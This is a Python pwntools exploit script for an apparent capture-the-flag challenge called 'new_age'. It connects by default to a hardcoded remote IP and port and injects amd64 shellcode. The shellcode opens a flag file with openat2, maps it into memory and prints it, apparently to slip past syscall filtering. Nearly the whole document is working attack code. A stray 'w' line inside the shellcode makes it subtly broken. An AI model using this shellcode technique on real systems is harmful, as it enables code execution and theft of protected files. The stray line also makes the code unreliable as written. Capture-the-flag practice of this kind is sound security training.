#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template new_age '--host=159.89.106.147' '--port=1337'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'new_age')
context.terminal = ["alacritty", "-e", "zsh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '159.89.106.147'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

# /app/flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt

shellcode = """
    lea rcx, [rdx + 0x1000]
w
    mov rdi, 0x00

    MOV RAX, 0x7478742e6861
    PUSH RAX
    MOV RAX, 0x6861686168616861
    PUSH RAX
    MOV RAX, 0x6861686168616861
    PUSH RAX
    MOV RAX, 0x5f6d6f646e40525f
    PUSH RAX
    MOV RAX, 0x65425f646c756f68
    PUSH RAX
    MOV RAX, 0x535f656d616e5f67
    PUSH RAX
    MOV RAX, 0x616c662f7070612f
    PUSH RAX

    mov rsi, rsp
    
    xor rax, rax
    push rax
    push rax
    push rax
    mov rdx, rsp

    mov r10, 24

    mov rax, 0x1b5
    syscall

    mov rdi, rcx 
    mov rsi, 0x1000
    mov rdx, 0x1
    mov r10, 0x1
    mov r8, rax
    mov r9, 0x00
    
    mov rax, 0x9
    syscall

    mov rdi, 0x1
    mov rsi, rax
    mov rdx, 0x100

    mov rax, 0x01
    syscall    
"""

io.recvlines(5)
io.send(asm(shellcode))

io.interactive()

